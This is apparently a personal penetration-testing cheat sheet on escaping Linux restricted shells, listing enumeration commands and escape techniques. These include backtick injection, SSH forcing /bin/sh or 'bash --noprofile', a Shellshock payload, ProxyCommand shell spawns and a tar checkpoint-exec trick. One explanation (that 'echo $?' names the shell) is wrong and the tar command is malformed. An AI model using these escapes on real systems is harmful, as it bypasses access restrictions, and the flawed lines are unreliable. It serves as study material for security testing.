---
id: Restricted Shell
aliases: []
tags:
  - Linux/Privesc/Restricted-Shell
links: "[[Linux/General]]"
---

<!-- Restricted Shells {{{-->
# Restricted Shells

A [Restricted Shell](https://en.wikipedia.org/wiki/Restricted_shell)
is a shell that limits the user's ability
to execute a specific set of commands in the specified directories

<!-- Restricted Shells {{{-->
> [!info]- Restricted Shells
>
> - [Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
>   (*rbash*)
> - [Restricted Korn shell](https://www.ibm.com/docs/en/aix/7.2.0?topic=r-rksh-command)
>   (*rksh*)
> - [Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html)
>   (*rzsh*)
<!-- }}} -->

<!-- Resources {{{-->
> [!info]- Resources
>
> - [Exploit DB](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)
> - [0xffsec](https://0xffsec.com/handbook/shells/restricted-shells/)
<!-- }}} -->

___

<!-- Enumeration {{{-->
## Enumeration

<!-- Shell {{{-->
### Shell

Return information about the current `$SHELL` and `$PATH`

```sh
echo $SHELL
```

```
echo $?
```

<!-- Info {{{-->
> [!info]-
>
> `echo $?` returns the name of the running process
> (*name of the shell*)
<!-- }}} -->

<!-- }}} -->

<!-- Available Commands {{{-->
### Available Commands

List available commands

```sh
compgen -c | sort -u > commands.txt
```

List the `$PATH` content to see available commands

```sh
printf "%s\n" $(echo "$PATH" | \
  tr ':' ' ')/* 2>/dev/null | \
  xargs -n1 basename | \
  sort -u \
  > commands.txt
```

List the `$PATH` content manually

```sh
echo $PATH
```

```sh
echo /usr/local/rbin/*
```


<!-- }}} -->

___
<!-- }}} -->

<!-- Escape {{{-->
## Escape

It may be possible to escape from a restricted shell by injecting commands
into the command line or other inputs the shell accepts

<!-- Command Injection {{{-->
### Command Injection

Inject a restricted command as argument to another command

```sh
<command> [args] `<injected_command>`
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ls -l `pwd`
> ```
>
> > [!info]-
> >
> > The command (*`ls`*) is executed with its argument (*`-l`*),
> > followed by the output of the injected command (*`pwd`*)
>
> The shell allows the execution of the injected command (*`pwd`*)
<!-- }}} -->

<!-- }}} -->

<!-- Command Changing {{{-->
### Command Changing

> [!todo]

<!-- }}} -->

<!-- Environment Variables {{{-->
### Environment Variables

List exported (*writeable*) variables

```sh
export -p
```

> [!todo]

<!-- }}} -->

<!-- Shell Functions {{{-->
### Shell Functions

> [!todo]

<!-- }}} -->

<!-- Copy Files {{{-->
### Copy Files



<!-- }}} -->

## SSH

Run the defined shell instead of the restricted

```sh
ssh <user>@<target> -t "/bin/sh" # or "/bin/bash"
```

Start Bash without loading profile/configuration files

```sh
ssh <user>@<target> -t "bash --noprofile"
```

Exploit [Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug))

```sh
ssh <user>@<target> -t "() { :; }; /bin/bash"
```

Run an arbitrary command before connection is established
(**)

```sh
ssh -o ProxyCommand="sh -c /tmp/<script>.sh" 127.0.0.1
```

```sh
ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

## TAR

```sh
tar > tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

<!-- }}} -->

___
<!-- }}} -->
